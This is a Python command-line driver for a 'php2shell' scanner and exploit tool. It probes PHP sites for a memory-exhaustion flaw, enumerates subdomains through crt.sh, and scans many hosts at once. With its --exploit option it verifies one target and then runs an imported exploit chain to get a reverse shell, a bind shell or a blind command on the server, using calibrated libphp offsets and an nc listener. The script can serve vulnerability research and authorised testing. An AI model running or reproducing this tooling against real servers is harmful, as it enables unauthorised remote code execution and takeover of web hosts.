#!/usr/bin/env python3

import argparse
import math
import os
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

import scan
import subdomains

# paths.txt ships alongside this script (in the repo and in the Nix store).
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PATH_FILE = os.path.join(SCRIPT_DIR, "paths.txt")

USER_AGENT = "php2shell-scanner"

parser = argparse.ArgumentParser(
    prog="php2shell-scanner", description="Scan for php2shell"
)
parser.add_argument(
    "-t",
    "--target",
    action="append",
    default=[],
    help=(
        "A URL to scan as-is, e.g. http://example.com (may be given multiple "
        "times). Paths are never applied to --target."
    ),
)
parser.add_argument(
    "-d",
    "--domain",
    action="append",
    default=[],
    help="A domain to scan (may be given multiple times)",
)
parser.add_argument(
    "--subdomain",
    action="store_true",
    help="Enumerate and scan subdomains of each --domain (crt.sh)",
)
parser.add_argument(
    "-p",
    "--path",
    action="append",
    default=[],
    help=(
        "A URL path to probe on each --domain target (may be given multiple "
        "times). Does not apply to --target, which is scanned as-is."
    ),
)
parser.add_argument(
    "--path-file",
    help=(
        "File of URL paths to probe on each --domain target, one per line "
        "(blank lines and lines starting with '#' are ignored). Defaults to "
        "paths.txt in this repo."
    ),
)
parser.add_argument(
    "--log",
    help="Write findings (matched results only) to this file",
)
parser.add_argument(
    "--exploit",
    action="store_true",
    help=(
        "After the scanner verifies php2shell on a single --target, run the "
        "php2shell exploit chain against it to get a reverse shell (only "
        "usable with exactly one --target and no --domain). Start a listener "
        "first, e.g. nc -lvnp 4444."
    ),
)
parser.add_argument(
    "--lhost",
    help="Host for the target's reverse shell to connect back to (required with --exploit reverse-shell mode)",
)
parser.add_argument(
    "--lport",
    type=int,
    default=4444,
    help="Port for the reverse shell (default: 4444)",
)
parser.add_argument(
    "--command",
    help=(
        "With --exploit, run this single command (max 14 bytes, blind, no "
        "output) instead of a reverse shell, e.g. 'id>/out/p1'"
    ),
)
parser.add_argument(
    "--profile",
    choices=("official", "official83", "lab"),
    default="official",
    help="Target build profile with calibrated heap/libphp offsets (default: official)",
)
parser.add_argument(
    "--zif-offset",
    type=lambda x: int(x, 0),
    help="Offset of zif_system in libphp.so (overrides the profile)",
)
parser.add_argument(
    "--dtor-offset",
    type=lambda x: int(x, 0),
    help="Offset of ZVAL_PTR_DTOR in libphp.so (overrides the profile)",
)
parser.add_argument(
    "--htdata-offset",
    type=lambda x: int(x, 0),
    help="Chunk-relative offset of the 167-byte carrier string (overrides the profile)",
)
parser.add_argument(
    "--bind-port",
    type=int,
    help=(
        "With --exploit: port the bind shell listens on, on the TARGET "
        "(default: 4444). The scanner connects to it and drives the session; "
        "no catch listener needed. Selects bind mode; --lhost selects "
        "reverse mode instead"
    ),
)
parser.add_argument(
    "--no-serve",
    action="store_true",
    help=(
        "With --exploit/--bind-port, do not start the local script server; "
        "the script is assumed to be served already at --serve-host/--serve-port"
    ),
)
parser.add_argument(
    "--serve-host",
    help=(
        "With --exploit/--bind-port: host the target can fetch the bind-shell "
        "script from (must fit the 14-byte carrier: short DNS name, "
        "inet_aton short form like '10.1', or '0' for the target's loopback). "
        "Defaults to --lhost"
    ),
)
parser.add_argument(
    "--serve-port",
    type=int,
    help=(
        "With --exploit: local port the scanner serves the shell script on "
        "(default: auto-detected -- a free <=4-digit port for loopback "
        "targets, 80 for remote targets)"
    ),
)
parser.add_argument(
    "--retries",
    type=int,
    default=3,
    help="Exploit attempts per leak stage (default: 3)",
)
parser.add_argument(
    "--huge-mb",
    type=int,
    help=(
        "Size of the OOM field in MiB; must exceed the target's "
        "memory_limit (default: auto-detected from the target's OOM fatal, "
        "else 12)"
    ),
)


def _ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def validate_web_server(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False, "URL must start with http:// or https:// (got: " + url + ")"
    if not parsed.netloc:
        return False, "URL is missing a host (got: " + url + ")"

    ctx = _ssl_context()
    for method in ("HEAD", "GET"):
        req = urllib.request.Request(
            url, method=method, headers={"User-Agent": USER_AGENT}
        )
        try:
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                return True, "responded HTTP " + str(resp.getcode())
        except urllib.error.HTTPError as exc:
            # The server answered (even a 4xx/5xx) so it is a web server.
            return True, "responded HTTP " + str(exc.code)
        except urllib.error.URLError as exc:
            reason = str(exc.reason)
            continue
        except (ValueError, OSError) as exc:
            reason = str(exc)
            continue
    return False, "no HTTP response: " + reason


def load_paths(args):
    paths = list(args.path)

    if args.path_file:
        path_file = args.path_file
        required = True
    else:
        path_file = DEFAULT_PATH_FILE
        required = False

    if os.path.isfile(path_file):
        with open(path_file) as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                paths.append(line)
    elif required:
        parser.error("path file not found: " + path_file)
    elif not paths:
        print("Note: default path file not found (" + path_file + ").")

    seen = set()
    unique = []
    for path in paths:
        if path not in seen:
            seen.add(path)
            unique.append(path)
    return unique


def join_url(base, path):
    if not path:
        return base
    return base.rstrip("/") + "/" + path.lstrip("/")


def apply_paths(targets, paths):
    if not paths:
        return targets
    expanded = []
    for target in targets:
        for path in paths:
            expanded.append(join_url(target, path))
    return expanded


def enumerate_subdomains(domain):
    """Passive subdomain enumeration via Certificate Transparency (crt.sh)."""
    print("Enumerating subdomains for " + domain + " via crt.sh...")
    return subdomains.enumerate_subdomains(domain)


def verify_target(target):
    """Deep-verify the vulnerability; returns the scan result dict.

    Deep probing escalates body sizes so targets whose memory_limit is above
    the template's 20 MiB still show the OOM fatal, and captures the
    target's memory_limit / max_input_vars so the exploit can adapt.
    """
    import math

    for attempt in range(2):
        res = scan.check_url(target, deep=True)
        if res["result"] != scan.UNKNOWN:
            print(scan.finding_line(res))
            if res["memory_limit"]:
                print("Target memory_limit: %d bytes (%d MiB)"
                      % (res["memory_limit"],
                         res["memory_limit"] // (1024 * 1024)))
            if res["max_input_vars"]:
                print("Target max_input_vars: %d" % res["max_input_vars"])
            return res
        print("Scan attempt %d inconclusive; retrying..." % (attempt + 1))
    return None


def run_exploit(args):
    """Verify the vulnerability on the single --target, then exploit it."""
    import exploit

    if len(args.target) != 1:
        parser.error("--exploit requires exactly one --target")
    if args.domain or args.subdomain:
        parser.error("--exploit cannot be combined with --domain/--subdomain")

    target = args.target[0]
    res = verify_target(target)
    if res is None or res["result"] != scan.MEMORY_EXHAUSTION:
        if res is not None and res["result"] in (scan.VERSION_VULNERABLE,
                                                 scan.VERSION_EOL):
            print("The target reports a vulnerable PHP version but the OOM "
                  "fatal could not be triggered (memory_limit above "
                  "post_max_size, or display_errors=Off); the exploit chain "
                  "needs the OOM to corrupt session state, so it will not "
                  "run against this target.")
        else:
            print("Vulnerability not verified on " + target
                  + "; not exploiting.")
        return 1

    print("Vulnerability verified; starting exploit against " + target)

    # Adapt to the target's ini settings.
    if args.huge_mb is not None:
        huge_mb = args.huge_mb
    elif res["memory_limit"]:
        huge_mb = int(math.ceil(res["memory_limit"] / (1024 * 1024.0))) + 4
        print("Auto-sizing the OOM field to %d MiB (target memory_limit %d MiB)"
              % (huge_mb, res["memory_limit"] // (1024 * 1024)))
    else:
        huge_mb = 12
    max_vars = res["max_input_vars"] or 1000
    if max_vars > 1000:
        print("Target max_input_vars is %d; scaling the trigger request "
              "field counts (heap calibration may be off for this setup)"
              % max_vars)
    if res["memory_limit"] and res["memory_limit"] > 8 * 1024 * 1024:
        print("WARNING: target memory_limit is %d MiB; this exploit chain's "
              "heap calibration is tied to memory_limit=8M (the official "
              "php:8.4-apache lab profile). The leak stages are unlikely to "
              "succeed on this configuration."
              % (res["memory_limit"] // (1024 * 1024)))

    kwargs = dict(
        profile=args.profile,
        zif_offset=args.zif_offset,
        dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset,
        huge_mb=huge_mb,
        retries=args.retries,
        max_vars=max_vars,
    )
    if args.command:
        if len(args.command.encode()) > exploit.MAX_CMD:
            print(
                "--command is limited to " + str(exploit.MAX_CMD)
                + " bytes by the forged carrier."
            )
            return 1
        ok = exploit.exploit_command(target, args.command, **kwargs)
    elif args.bind_port is not None:
        # Bind mode explicitly selected: the shell listens on the target
        # (--bind-port, default 4444); the script fetch is served from
        # serve-host/serve-port (auto-detected when omitted).
        serve_port = args.serve_port or args.lport
        if serve_port is not None and not args.no_serve \
                and not (1 <= serve_port <= 65535):
            parser.error("--serve-port must be a valid TCP port")
        ok = exploit.exploit_bind(
            target, args.bind_port,
            serve_host=args.serve_host or args.lhost, serve_port=serve_port,
            serve=not args.no_serve, **kwargs,
        )
    elif args.lhost:
        ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
    else:
        # Plain --exploit: zero-setup bind shell. The script-fetch address is
        # auto-detected (loopback targets via their own 0.0.0.0; remote
        # targets via a short form of our source IP on port 80 when it fits).
        ok = exploit.exploit_bind(target, bind_port=None, serve_host=None,
                                  serve_port=None, **kwargs)
    return 0 if ok else 1


def run_scan(targets, log_path=None):
    if not targets:
        print("No targets to scan.")
        return 0

    print("Scanning " + str(len(targets)) + " target(s) for php2shell...")

    log_fh = None
    if log_path:
        log_dir = os.path.dirname(log_path)
        if log_dir:
            os.makedirs(log_dir, exist_ok=True)
        log_fh = open(log_path, "a")

    findings = 0
    try:
        for target in targets:
            if "://" not in target:
                target = "http://" + target
            res = scan.check_url(target)
            if res["result"] in (scan.MEMORY_EXHAUSTION, scan.VERSION_VULNERABLE,
                                 scan.VERSION_EOL):
                line = scan.finding_line(res)
                print(line)
                findings += 1
                if log_fh:
                    log_fh.write(line + "\n")
            elif res["result"] == scan.FIXED:
                print("[php2shell] " + target + " runs fixed PHP "
                      + res["version"] + " (OOM fatal present, not vulnerable)")
            elif res["version"]:
                print("[php2shell] no detection on " + target
                      + " (PHP " + res["version"] + ")")
    finally:
        if log_fh:
            log_fh.close()
    print("Done: " + str(findings) + " finding(s) across "
          + str(len(targets)) + " target(s).")
    return 0

def main():
    args = parser.parse_args()

    if not args.target and not args.domain:
        parser.error("provide --target and/or --domain")

    invalid = []
    for target in args.target:
        ok, detail = validate_web_server(target)
        if ok:
            print("Validated --target " + target + " (" + detail + ").")
        else:
            invalid.append(target + ": " + detail)
    if invalid:
        parser.error(
            "--target does not look like a web server:\n  "
            + "\n  ".join(invalid)
        )

    if args.exploit:
        sys.exit(run_exploit(args))

    paths = load_paths(args)

    # --target URLs are scanned exactly as given; path expansion only applies
    # to --domain targets.
    targets = list(args.target)

    domain_targets = []
    for domain in args.domain:
        if args.subdomain:
            domain_targets.extend(enumerate_subdomains(domain))
        else:
            domain_targets.append(domain)

    targets.extend(apply_paths(domain_targets, paths))

    seen = set()
    unique = []
    for target in targets:
        if target not in seen:
            seen.add(target)
            unique.append(target)

    sys.exit(run_scan(unique, args.log))


if __name__ == "__main__":
    main()
